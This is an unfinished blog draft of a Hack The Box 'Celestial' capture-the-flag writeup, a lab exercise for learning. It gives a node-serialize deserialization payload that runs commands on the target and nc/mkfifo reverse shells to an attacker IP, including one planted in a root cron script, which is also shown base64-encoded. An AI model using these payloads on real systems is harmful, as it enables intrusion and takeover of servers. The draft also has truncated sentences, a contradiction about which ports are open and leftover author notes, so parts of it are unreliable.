---
layout: post
title:  "Hack The Box - Celestial - Writeup"
date:   2000-01-01 07:00:00 +0200
tags: ["Hack The Box","OSWE"]
---
{% assign imgDir="HTB-Celestial-Writeup" %}

# Introduction
The hack the box machine "Celestial" is a medium machine which is included in [TJnull's OSWE Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=665299979). Exploiting this machine requires knowledge of 

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="BlockyCard">

By enumerating the target, it is possible to discover 

# Exploitation
We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.85`. The `-sS` `-sC` and `-sV` flags instructs nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that port `21`, `22`, `80` and `25565` are open. As can be seen below, this only reveals that port 3000 is open and is running [NodeJS]().

![nmap](/assets/{{ imgDir }}/nmap.png)

![burpResp1](/assets/{{ imgDir }}/burpResp1.png)
![burpResp2](/assets/{{ imgDir }}/burpResp2.png)

{% highlight none linenos %}
kali@kali:/tmp/x$ echo "eyJ[...]Q==" | base64 -d
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
{% endhighlight %}

We see that username and the num field are used. At this point, we can strongly suspect that the json blob is being parsed and that the parsed parameter values are being put back into the page. Some NodeJs serializers use JSON => We can try to create our own serializer payload. If this is the case, it should matter what variable name is used since the whole object is deserialized. 

{"evil":"_$$ND_FUNC$$_function (){require('child_process').exec('ping -c 10 10.10.14.11'); }()"}

![wireshark](/assets/{{ imgDir }}/wireshark.png)

{"evil":"_$$ND_FUNC$$_function (){require('child_process').exec('which nc && ping -c 10 10.10.14.11'); }()"}

sudo nc -lvnp 443

{"evil":"_$$ND_FUNC$$_function (){require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.11 443 >/tmp/f'); }()"}

![sunShell](/assets/{{ imgDir }}/sunShell.png)

Talk about SSTI vs deserialization?

# Privilege Escalation
The next step is to perfrom a privilege escalation from the `sun` user to the `root` user. 

Files in home of the `sun` user:
![sunHome](/assets/{{ imgDir }}/sunHome.png)

output.txt and node_modules look interesting since these are owned by root. By executing `cat output.txt` we get the content "Script is running..."
in addition, it was edited quite recently.

We find the files `user.txt` and `script.py` in the `/home/sun/Documents` folder. The script file contains a only contains the line `print "Script is running..."`. This is the content of the output file, we can strongly suspect that this script is executed on a regular basis. We also have the right to overwrite the script.py file since it belongs to us

put the following in /home/sun/script.py
{% highlight python linenos %}
import os
os.system("rm /tmp/q;mkfifo /tmp/q;cat /tmp/q|sh -i 2>&1|nc 10.10.14.11 443 >/tmp/q")
{% endhighlight %}

cat script.py | base64 -w0

aW1wb3J0IG9zCm9zLnN5c3RlbSgicm0gL3RtcC9xO21rZmlmbyAvdG1wL3E7Y2F0IC90bXAvcXxzaCAtaSAyPiYxfG5jIDEwLjEwLjE0LjExIDQ0MyA+L3RtcC9xIikK
echo '[base64]' | base64 -d > /home/sun/Documents/script.py

sudo nc -lvnp 443

wait 5 minutes

![rootShell](/assets/{{ imgDir }}/rootShell.png)

# Extra

We can find the cronjob if we list cronjobs with the "crontab -l" command as shown below. Note that the `grep -v '#'` part of the command is only used to remove any comments in the personal cronjob file which the `crontab -l` command shows.
![extra1](/assets/{{ imgDir }}/extra1.png)

Mention pspy brifely
